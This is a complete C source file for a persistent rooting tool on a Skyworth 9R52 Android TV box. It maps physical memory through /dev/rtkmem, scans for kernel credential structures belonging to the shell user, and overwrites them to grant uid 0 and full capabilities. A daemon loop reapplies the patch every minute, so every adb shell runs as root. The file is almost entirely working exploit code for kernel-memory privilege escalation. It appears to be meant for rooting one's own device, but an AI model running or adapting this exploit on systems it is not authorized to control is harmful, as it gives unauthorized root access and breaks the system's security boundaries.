/* sotv_root.c - persistent root bootstrap for Skyworth 9R52 (Android 5.1,
 * kernel 3.10.19). Installed as /system/xbin/sotv_root and launched from the
 * vendor boot script /system/etc/init.tvserver.sh.
 *
 * Mechanism (NO partition/bootloader writes at runtime, only RAM):
 *   /dev/rtkmem allows mmap of physical memory. Scan for struct cred whose
 *   8 uid/gid fields all equal AID_SHELL (2000), then zero them (uid 0) and
 *   raise all four capability sets to full. adbd forks shell children from
 *   such a cred, so every adb shell becomes uid=0 with full caps.
 *   A daemon loop re-applies every 60s so an adbd restart cannot undo root.
 *
 * Safety: writes only inside structs that match the strict cred signature.
 * No flash writes, no init binary replacement. Worst case kernel oops ->
 * automatic reboot -> clean state (the boot script will just rerun).
 *
 * Build: clang --target=armv7a-linux-androideabi19 --static -O2 -o sotv_root sotv_root.c
 * PT_TLS p_align must be patched to 64 (old Bionic).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#define SCAN_END  0x20000000UL
#define CHUNK     (1u << 20)
#define MAXHIT    64
#ifndef AID_SHELL
#define AID_SHELL 2000u
#endif

static sigjmp_buf g_jmp;
static void fault_handler(int sig) { (void)sig; siglongjmp(g_jmp, 1); }
static int fd;

static int pointerish(uint32_t v) {
    return v >= 0xc0000000u && v <= 0xf0000000u;
}

/* uid fields are checked against `want` so a single binary works both before
 * and after an adbd restart (which creates fresh uid=2000 creds). */
static int valid_cred(const uint32_t *w, uint32_t want) {
    /* Deliberately identical to the signature proven by rtroot.c on this
     * kernel: eight consecutive uid/gid words == AID_SHELL plus a sane usage
     * and securebits. That probe found exactly 4 real creds and no false
     * positives, so do NOT add stricter tail checks (they caused misses). */
    if (w[0] < 1 || w[0] > 1000000) return 0;
    for (int q = 1; q <= 8; q++) if (w[q] != want) return 0;
    if (w[9] != 0) return 0;                        /* securebits */
    return 1;
}

static int patch_one(uint64_t phys, uint32_t want, int quiet) {
    uint64_t page = phys & ~(uint64_t)0xfff;
    size_t off = (size_t)(phys - page);
    if (off + 80 > 0x1000) return 0;
    void *m = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
                   fd, (off_t)page);
    if (m == MAP_FAILED) return 0;
    unsigned char *p = (unsigned char *)m + off;
    if (sigsetjmp(g_jmp, 1)) { munmap(m, 0x1000); return 0; }
    uint32_t w[27];
    memcpy(w, p, sizeof(w));
    if (!valid_cred(w, want)) { munmap(m, 0x1000); return 0; }
    volatile uint32_t *q = (volatile uint32_t *)p;
    for (int k = 1; k <= 8; k++) q[k] = 0;          /* uid..fsgid -> root */
    for (int k = 10; k < 18; k++) q[k] = 0xFFFFFFFFu; /* all caps -> full */
    __sync_synchronize();
    msync(m, 0x1000, MS_SYNC);
    munmap(m, 0x1000);
    if (!quiet)
        printf("    patched cred phys=0x%llx usage=%u\n",
               (unsigned long long)phys, w[0]);
    return 1;
}

static int run_pass(int quiet) {
    uint64_t found[MAXHIT];
    int nfound = 0;
    for (uint64_t p = 0; p < SCAN_END && nfound < MAXHIT; p += CHUNK) {
        void *m = mmap(NULL, CHUNK, PROT_READ, MAP_SHARED, fd, (off_t)p);
        if (m == MAP_FAILED) continue;
        unsigned char *v = (unsigned char *)m;
        if (sigsetjmp(g_jmp, 1)) { munmap(m, CHUNK); continue; }
        for (size_t i = 0; i + 108 <= CHUNK && nfound < MAXHIT; i += 4) {
            uint32_t w[27];
            memcpy(w, v + i, sizeof(w));
            if (!valid_cred(w, AID_SHELL)) continue;
            found[nfound++] = p + i;
        }
        munmap(m, CHUNK);
    }
    int patched = 0;
    for (int i = 0; i < nfound; i++)
        patched += patch_one(found[i], AID_SHELL, quiet);
    if (!quiet) printf("[*] pass: %d creds found, %d patched\n", nfound, patched);
    return patched;
}

int main(int argc, char **argv) {
    int daemon = 0, quiet = 0, once_only = 0;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--daemon")) { daemon = 1; quiet = 1; }
        else if (!strcmp(argv[i], "--once")) once_only = 1;
        else if (!strcmp(argv[i], "--quiet")) quiet = 1;
    }
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = fault_handler;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    fd = open("/dev/rtkmem", O_RDWR);
    if (fd < 0) {
        if (!quiet) printf("open /dev/rtkmem: %s\n", strerror(errno));
        return 2;
    }
    if (!quiet) printf("[*] sotv_root pid=%d uid=%u daemon=%d\n",
                       (int)getpid(), getuid(), daemon);
    if (daemon) {
        /* let adbd and the rest of userspace settle first */
        sleep(8);
        for (;;) {
            run_pass(1);
            sleep(60);
        }
    }
    run_pass(quiet);
    if (!once_only && !quiet) {
        printf("[*] getuid()=%u geteuid()=%u\n", getuid(), geteuid());
    }
    close(fd);
    return 0;
}
